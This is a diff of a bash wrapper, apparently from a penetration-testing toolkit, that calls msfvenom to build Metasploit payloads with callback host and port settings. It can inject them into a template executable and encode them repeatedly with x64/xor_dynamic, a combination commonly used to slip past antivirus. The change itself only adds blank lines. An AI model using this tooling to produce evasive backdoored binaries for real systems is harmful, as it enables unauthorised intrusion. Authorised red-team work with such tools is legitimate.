@@ -9,6 +9,7 @@ f_msfvenom_run(){
     echo "[*] Generating payload..."
     msfvenom "$@" > "$output" 2>&1 || rc=$?
     grep -E '^(Found |Attempting |Payload size:|[[:alnum:]_.+-]+ (succeeded|chosen))' "$output" || true
+
     if [ "$rc" -ne 0 ]; then
         echo
         echo -e "${RED}[!] msfvenom failed.${NC}"
@@ -17,6 +18,7 @@ f_msfvenom_run(){
             | sed '/^$/d' | head -10
         echo
     fi
+
     rm -f "$output"
     return $rc
 }
@@ -226,12 +228,14 @@ if [ "$ANSWER" == "y" ]; then
 
     OUTPUT_FILE="$HOME/data/$X-$LPORT-$ITERATIONS$EXTENTION"
     echo
+
     if ! f_msfvenom_run -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -x "$TEMPLATE" -e x64/xor_dynamic -i "$ITERATIONS" -o "$OUTPUT_FILE"; then
         f_invalid; exit 1
     fi
 else
     OUTPUT_FILE="$HOME/data/$X-$LPORT-$ITERATIONS$EXTENTION"
     echo
+
     if ! f_msfvenom_run -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f "$FORMAT" -a "$ARCH" --platform "$PLATFORM" -e x64/xor_dynamic -i "$ITERATIONS" -o "$OUTPUT_FILE"; then
         f_invalid; exit 1
     fi
